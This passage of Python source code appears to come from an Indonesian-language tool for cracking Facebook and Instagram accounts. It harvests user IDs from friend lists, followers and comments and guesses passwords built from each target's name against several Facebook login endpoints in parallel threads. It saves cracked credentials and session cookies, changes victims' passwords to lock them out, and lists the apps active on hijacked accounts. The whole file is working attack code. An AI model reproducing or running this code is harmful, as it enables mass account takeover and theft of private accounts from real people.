            if "profile.php" in mmk.get('href'):
                bb = mmk.text
                xd = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",mmk.get("href")))
                id.append(bb+'<=>'+xd+'\n')
            sys.stdout.write('\r [*]\x1b[1;93m sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        for asu in memek.find_all('a',href=True):
            if 'Lihat Selengkapnya' in asu.text:
                followers("https://mbasic.facebook.com/subscribe/lists/?id="+asu.get("href"))
    except:pass
def ngomen_post(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        kueh  = {"cookie":_mmk_}
        kontol= requests.get(hencet,cookies=kueh,headers=header_grup).text.encode("utf-8")
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('h3'):
            for _id_ in mmk.find_all('a',href=True):
                if "profile.php" in _id_.get("href"):
                    xz = _id_.get("href").split('=')[1]
                    bb = xz.split('&')[0]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                else:
                    xz = _id_.get("href").split('?')[0]
                    bb = xz.split('/')[1]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                sys.stdout.write('\r [*] \x1b[1;93msedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        for asu in memek.find_all("a",href=True):
            if "Lihat komentar lainnya…" in asu.text:
                ngomen_post("https://mbasic.facebook.com/"+asu.get("href"))
    except:pass
def _ngocok_(__ppk__):
    try:
        nanya_keun = int(input('\n [%s?%s]\x1b[1;93m masukan jumblah target : '%(M,N)))
    except:nanya_keun=1
    print(" [%s*%s] \x1b[1;97mKetik \x1b[1;92m'me' \x1b[1;97mjika ingin crack dari daftar teman\n"%(O,N))
    for mnh in range(nanya_keun):
        mnh +=1
        user = input(' [%s*%s] \x1b[1;93mmasukan id atau username %s%s%s : '%(O,N,H,mnh,N))
        _memek_ = __convert__(user)
        try:
            for a in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s'%(_memek_.get('_kontol_'),__ppk__)).json()["data"]:
                uid = a["id"]
                nama = a["name"]
                id.append(uid+"<=>"+nama)
        except (KeyError,IOError):
            print('\n [×] \x1b[1;91mgagal mengambil id, kemungkinan id tidaklah publik');time.sleep(3);moch_yayan()
def __convert__(user):
    if user == "me":
        return {"_kontol_":user}
    else:
        payload = {"fburl": "https://free.facebook.com/{}".format(user), "check": "Lookup"}
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        mmk = requests.post(url_lookup, data=payload).content
        xxx = BeautifulSoup(mmk, "html.parser")
        idt = xxx.find("span", id="code")
        asw = idt.text
        return {"_kontol_":asw}
def gabut():
    dirs = os.listdir("results")
    print('\n\x1b[1;97m [ hasil crack yang tersimpan di file anda ]\n')
    for file in dirs:
        print(" [%s+%s] %s"%(O,N,file))
    jalan(f" [{M}×{N}] \x1b[1;93msebelum memasukan file,hidupkan mode pesawat 3 detik.");time.sleep(5)
    files = input("\n [%s?%s] \x1b[1;93mmasukan nama file : %s"%(M,N,H))
    try:
        buka_baju = open(f'results/{files}','r').readlines()
    except IOError:
        print('\n [!] file tidak ada');time.sleep(2);moch_yayan()
    ww=input(f"\n {N}[{O}?{N}] \x1b[1;97mubah password ketika tap yes [Y/t]: ")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f" [{H}•{N}] \x1b[1;93mcontoh password : {H} Sanz-Tzy{N}")
        pwBar=input(f"\n [{H}+{N}] masukan password baru : ")
        if len(pwBar) <= 5:
             print('\n %s[%s×%s] \x1b[1;91mkata sandi minimal 6 karakter'%(N,M,N))
        else:
            pwBaru.append(pwBar)
    print('%s [%s*%s] Total %s%s%s Akun'%(N,O,N,K,str(len(buka_baju)),N))
    jalan(" %s[%s#%s] --------------------------------------------"%(N,O,N))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split('|')
        jalan(f' {N}[{M}>{N}] \x1b[1;93mmencoba login ke akun : {K}{kontol.replace(" [×] ", "")}{N}')
        try:
            log_hasil(titid[0].replace(" [×] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    print('   [ %sProses Pengecekan Selesai %s]\n'%(H,N))
    input(' [ %sKEMBALI%s ] '%(O,N));os.system(f"rm -rf {buka_baju}");moch_yayan()
def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    session.headers.update({
        "Host":"mbasic.facebook.com",
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9",
        "referer":"https://mbasic.facebook.com/",
        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
    })
    soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(N,M,N)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print(f"\r {N}[{M}×{N}] akun sesi new")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OKE.txt', 'a').write(f" [✓] {user}|{pasw}|{coki}\n")
            print(f"\r  🎉{H} hore akunya tidak checkpoint{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengecek aplikasi...{N}");time.sleep(0.03)
            cek_apk(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    print(f"\r  🎉{H} hore akunya tap yes{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "Sanz-Tzy"
                    print(f"\r  🎉{H} hore akunya tap yes{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print(' [%s!%s] opshh akunya terpasang autentikasi dua faktor :('%(M,N))
            else:
                open('results/ERROR.txt', 'a').write(f" [×] {user}|{pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f" [×] {user}|{pasw}\n")
            print(" %s[%s*%s] Terdapat %s Opsi "%(N,O,N,len(cek)))
        for opt in range(len(cek)):
            print(f" [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
    else:
        print(f"\r {N}[{M}!{N}] Kata sandi salah atau sudah diubah")
        open('results/INVALID-OK.txt', 'a').write(f" [×] {user}|{pasw}\n")
def ubah_pw(session,response,link2,user,mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        print(f"\r {N}[{H}✓{N}] berhasil mengubah password menjadi:\n {N}[{H}✓{N}]{H} {user}|{''.join(mmk)}|{coki}{N}")
        open('results/TAB-YES.txt', 'a').write(f" [✓] {user}|{''.join(mmk)}|{coki}\n")
        cek_apk(session,coki)
def cek_apk(session,cookie):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
    else:
        for i in range(len(game)):
            print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
    else:
        for i in range(len(game)):
            print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
class __crack__:
    def __init__(self):
        self.id = []
    def plerr(self,id):
        self.id = id
        print(' [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N))
        ___yayanganteng___ = input(' [%s?%s] \x1b[1;97mapakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print('\n %s[%s!%s] \x1b[1;93mgunakan , \x1b[1;97m(koma) \x1b[1;93muntuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N))
            while True:
                pwek = input('\n [%s?%s] \x1b[1;96mmasukan kata sandi : '%(O,N))
                print(' [*]\x1b[1;93m crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N))
                if pwek == '':
                    print('\n %s[%s×%s]\x1b[1;91m jangan kosong bro kata sandi nya'%(N,M,N))
                elif len(pwek)<=5:
                    print('\n %s[%s×%s] \x1b[1;91mkata sandi minimal 6 karakter'%(N,M,N))
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = input('\n [*]\x1b[1;93m method : ')
                        if cin == '':
                            print('\n %s[%s×%s] \x1b[1;91mjangan kosong bro'%(N,M,N));__yan__()
                        elif cin == '1':
                            print('\n [%s+%s] \x1b[1;92mhasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] \x1b[1;93mhasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] \x1b[1;97manda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass
                            hasil(ok,cp)
                        elif cin == '2':
                            print('\n [%s+%s] \x1b[1;92mhasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] \x1b[1;93mhasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] \x1b[1;97manda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass
                            hasil(ok,cp)
                        elif cin == '3':
                            print('\n [%s+%s] \x1b[1;97mhasil \x1b[1;92mOK \x1b[1;97mdisimpan ke -> \x1b[1;92mresults/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] \x1b[1;97mhasil \x1b[1;93mCP \x1b[1;97mdisimpan ke -> \x1b[1;93mresults/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] \x1b[1;97mMainkan Mode pesawat 5 detik jika tidak ada hasil\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb__, kimochi, ysc)
                                    except: pass
                            hasil(ok,cp)
                        else:
                            print('\n %s[%s×%s]\x1b[1;91m input yang bener'%(N,M,N));__yan__()
                    print('\n \x1b[1;97m[ pilih method login - silahkan coba satu² ]\n')
                    print(' \x1b[1;97m[%s01%s\x1b[1;97m] \x1b[1;93mmethod API \x1b[1;96m[\x1b[1;97mfast\x1b[1;96m]'%(O,N))
                    print(' \x1b[1;97m[%s02%s\x1b[1;97m] \x1b[1;93mmethod mbasic \x1b[1;96m[\x1b[1;97mslow\x1b[1;96m]'%(O,N))
                    print(' \x1b[1;97m[%s03%s\x1b[1;97m] \x1b[1;93mmethod mobile \x1b[1;96m[\x1b[1;97msuper slow\x1b[1;96m]'%(O,N))
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
                    print('\n \x1b[1;97m[ pilih method login - silahkan coba satu² ]\n')
                    print(' \x1b[1;97m[%s01%s\x1b[1;97m] \x1b[1;93mmethod API \x1b[1;96m[\x1b[1;97mfast\x1b[1;96m]'%(O,N))
                    print(' \x1b[1;97m[%s02%s\x1b[1;97m] \x1b[1;93mmethod mbasic \x1b[1;96m[\x1b[1;97mslow\x1b[1;96m]'%(O,N))
                    print(' \x1b[1;97m[%s03%s\x1b[1;97m] \x1b[1;93mmethod mobile \x1b[1;96m[\x1b[1;97msuper slow\x1b[1;96m]'%(O,N))
                    self.__pler__()
        else:
            print('\n %s[%s×%s] \x1b[1;91my/t goblok!'%(N,M,N));self.plerr(id)
    def __api__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%s] [Sanz] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'Anda Tidak Dapat Menggunakan Fitur Ini Sekarang' in response.text:
                sys.stdout.write('\r %s[%s!%s] \x1b[1;91mHidupkan mode pesawat 2 detik      '%(N,M,N)),
                loop+=1
                sys.stdout.flush()
                self.__api__()
            if 'session_key' in response.text and 'EAAA' in response.text:
                coki = ";".join(i["name"]+"="+i["value"] for i in send.json()["session_cookies"])
                print('\r %s[OK] %s|%s|%s                 %s' % (H,user,pw,coki,N))
                wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r %s[CP] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r %s[CP] %s|%s                %s' % (K,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%s] [Sanz] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if 'c_user' in ses.cookies.get_dict().keys():
                coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print('\r %s[OK] %s|%s|%s                 %s' % (H,user,pw,coki,N))
                wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r %s[CP] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r %s[CP] %s|%s                %s' % (K,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%s] [Sanz] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if 'c_user' in ses.cookies.get_dict().keys():
                coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print('\r %s[OK] %s|%s|%s                 %s' % (H,user,pw,coki,N))
                wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r %s[CP] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r %s[CP] %s|%s                %s' % (K,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
    def __pler__(self):
        yan = input('\n [*] \x1b[1;93mmethod : ')
        if yan == '':
            print('\n %s[%s×%s]\x1b[1;91m jangan kosong bro'%(N,M,N));self.__pler__()
        elif yan in ('1', '01'):
            print('\n [%s+%s] \x1b[1;97mhasil \x1b[1;92mOK \x1b[1;97mdisimpan ke -> \x1b[1;92mresults/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print(' [%s+%s] \x1b[1;97mhasil \x1b[1;93mCP \x1b[1;97mdisimpan ke -> \x1b[1;93mresults/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print('\n [%s!%s] \x1b[1;97mMainkan Mode pesawat 5 detik jika tidak ada hasil\n'%(M,N))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        kirim.submit(self.__api__, uid, pwx)
                    except:
                        pass
            hasil(ok,cp)
        elif yan in ('2', '02'):
            print('\n [%s+%s] \x1b[1;97mhasil \x1b[1;92mOK \x1b[1;97mdisimpan ke -> \x1b[1;92mresults/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print(' [%s+%s] \x1b[1;97mhasil \x1b[1;93mCP \x1b[1;97mdisimpan ke -> \x1b[1;93mresults/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print('\n [%s!%s] \x1b[1;97mMainkan Mode pesawat 5 detik jika tidak ada hasil\n'%(M,N))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        kirim.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
            hasil(ok,cp)
        elif yan in ('3', '03'):
            print('\n [%s+%s] \x1b[1;97mhasil \x1b[1;92mOK \x1b[1;97mdisimpan ke ->\x1b[1;92m results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print(' [%s+%s] \x1b[1;97mhasil \x1b[1;93mCP \x1b[1;97mdisimpan ke -> \x1b[1;93mresults/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print('\n [%s!%s] \x1b[1;97mMainkan Mode pesawat 5 detik jika tidak ada hasil\n'%(M,N))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        kirim.submit(self.__mfb__, uid, pwx)
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n %s[%s×%s] \x1b[1;91minput yang bener'%(N,M,N));self.__pler__()
yan, status_foll, poll, cr, looping = [], [], [], [], 1
url_instagram = "https://www.instagram.com/"
user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"]
urll = "https://www.instagram.com/"
url = "https://www.instagram.com/accounts/login/ajax/"
headerz = {"User-Agent": user_agentz}
headerz_api = {"User-Agent": user_agentz_api}
header = {}
param = {}
def proses():
    print('\n\n %s[%s+%s] \x1b[1;92mhasil OK disimpan ke -> results/IG-OK-%s-%s-%s.txt'%(N,O,N,ha, op, ta));time.sleep(0.2)
    print(' [%s+%s] \x1b[1;93mhasil CP disimpan ke -> results/IG-CP-%s-%s-%s.txt'%(O,N,ha, op, ta));time.sleep(0.2)
    print('\n [%s!%s] \x1b[1;97mtekan ctrl+z di keyboard anda untuk menjeda proses crack\n'%(M,N));time.sleep(0.2)
def log_igeh():
    global cookie
    try:
        kontol = open("ig.txt", "r").read()
    except IOError:
        masuk_ig()
    else:
        url = "https://i.instagram.com/api/v1/friendships/39431798677/followers/?count=5"
        with requests.Session() as ses:
            try:
                otw = ses.get(url, cookies={"cookie": kontol}, headers=headerz_api)
                if "users" in json.loads(otw.content):
                    cookie = {"cookie": kontol}
                else:
                    print('\n %s[%s×%s] cookie invalid'%(N,M,N));time.sleep(2);os.system('rm -rf ig.txt');masuk_ig()
            except ValueError:
                print('\n %s[%s×%s] cookie invalid'%(N,M,N));time.sleep(2);os.system('rm -rf ig.txt');masuk_ig()
def masuk_ig():
    global cookie
    jalan("\n %s[%s+%s] \x1b[1;93mLogin menggunakan akun tumbal Instagram anda [%s+%s]"%(N,H,N,H,N))
    print(" [+]----------------------------------------------[+]");time.sleep(0.03)
    userr = input(' [%s?%s] \x1b[1;93musername :%s '%(H,N,K))
    peweh = input('%s [%s?%s] \x1b[1;93mpassword :%s '%(N,H,N,K))
    try:
        try:
            headerz = {"User-Agent": user_agentz}
            with requests.Session() as ses:
                scr = "https://www.instagram.com/"
                data = ses.get(scr, headers=headerz).content
                toket = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
            headerss = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": toket,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,}
            param = {"username": userr,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), peweh),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
            }
        except:
            header = {}
            param = {}
            pass
        with requests.Session() as ses:
            url = "https://www.instagram.com/accounts/login/ajax/"
            respon = ses.post(url, data=param, headers=headerss)
            data = json.loads(respon.content)
